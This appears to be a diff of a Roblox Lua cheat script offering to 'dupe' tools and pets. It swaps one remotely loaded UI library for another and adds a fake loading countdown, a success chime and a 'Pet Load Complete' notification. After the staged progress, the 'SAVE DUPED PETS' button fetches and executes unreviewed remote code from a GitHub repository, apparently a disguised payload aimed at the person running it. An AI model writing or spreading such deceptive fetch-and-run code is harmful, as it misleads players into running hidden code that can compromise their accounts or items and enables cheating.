@@ -1,38 +1,35 @@
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
 local player = Players.LocalPlayer
 
--- Kavo UI の読み込み
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("2.0 - New Flow", "Ocean")
+local Venyx = loadstring(game:HttpGet("https://raw.githubusercontent.com/DenizDemirkaya/Venyx-UI-Library/main/source.lua"))()
+local ui = Venyx.new("2.0 - New Flow", 5013109572)
 
-local MainTab = Window:NewTab("Main")
-local MainSection = MainTab:NewSection("Main Controls")
+local mainPage = ui:CreatePage("Main", 5012544693)
+local mainSection = mainPage:AddSection("Main Controls")
 
--- ツール表示ラベル（初期化）
-local toolLabel = MainSection:NewLabel("Holding: Nothing")
-
--- 定期的にツール表示更新
+-- ツール表示
+local toolLabel = mainSection:AddLabel("Holding: Nothing")
 RunService.RenderStepped:Connect(function()
 	local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
 	local name = tool and tool.Name or "Nothing"
-	toolLabel:Destroy()
-	toolLabel = MainSection:NewLabel("Holding: " .. name)
+	toolLabel:UpdateText("Holding: " .. name)
 end)
 
--- Dupe Amount 入力
+-- Dupe 数入力
 local dupeAmount = 1
-MainSection:NewTextBox("Dupe Amount (1-100)", "Enter a number", function(text)
+mainSection:AddTextbox("Dupe Amount (1-100)", function(text)
 	local number = tonumber(text)
 	if number and number >= 1 and number <= 100 then
 		dupeAmount = number
 	else
 		warn("Enter a number between 1 and 100")
 	end
-end)
+end, {clear = false})
 
--- 複製ボタン
-MainSection:NewButton("DUPE", "Duplicate your tool", function()
+-- Dupe ボタン
+mainSection:AddButton("DUPE", function()
 	local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
 	if not tool then
 		warn("No tool to duplicate.")
@@ -44,27 +41,47 @@ MainSection:NewButton("DUPE", "Duplicate your tool", function()
 	end
 end)
 
--- 状態表示（更新可能なように再生成）
-local statusLabel
+-- ステータス表示
+local statusLabel = mainSection:AddLabel("SAVE STATUS: Ready")
 local function setStatus(text)
-	if statusLabel then
-		statusLabel:Destroy()
-	end
-	statusLabel = MainSection:NewLabel("SAVE STATUS: " .. text)
+	statusLabel:UpdateText("SAVE STATUS: " .. text)
 end
 
-setStatus("Ready")
+-- 二重実行防止フラグ
+local saving = false
 
--- SAVE DUPED PETS ボタン（30秒後にスクリプト実行）
-MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", function()
+-- SAVE DUPED PETS ボタン
+mainSection:AddButton("SAVE DUPED PETS", function()
+	if saving then
+		setStatus("⚠️ Already saving, please wait...")
+		return
+	end
+	saving = true
+
 	task.spawn(function()
+		-- 30秒カウントダウン
 		for i = 30, 1, -1 do
-			setStatus("⌛ Loading pet info... (" .. i .. "s)")
+			local dots = string.rep(".", (i % 3) + 1)
+			local symbol = (i % 2 == 0) and "⌛" or "⏳"
+			setStatus(symbol .. " Loading" .. dots .. " (" .. i .. "s)")
 			wait(1)
 		end
 
-		setStatus("🚀 Booting...")
+		-- 🎧 サウンドで知らせる
+		local sound = Instance.new("Sound", workspace)
+		sound.SoundId = "rbxassetid://9118823102" -- 成功チャイム音
+		sound.Volume = 1
+		sound:Play()
 
+		-- 🔔 通知を表示
+		StarterGui:SetCore("SendNotification", {
+			Title = "✅ Pet Load Complete",
+			Text = "Pet information has been loaded.",
+			Duration = 5
+		})
+
+		-- スクリプト実行
+		setStatus("🚀 Booting...")
 		local success, err = pcall(function()
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagarden/refs/heads/main/uitest"))()
 		end)
@@ -74,5 +91,9 @@ MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", functi
 		else
 			setStatus("❌ Error: " .. tostring(err))
 		end
+
+		saving = false
 	end)
 end)
+
+ui:SelectPage(ui.pages[1], true)
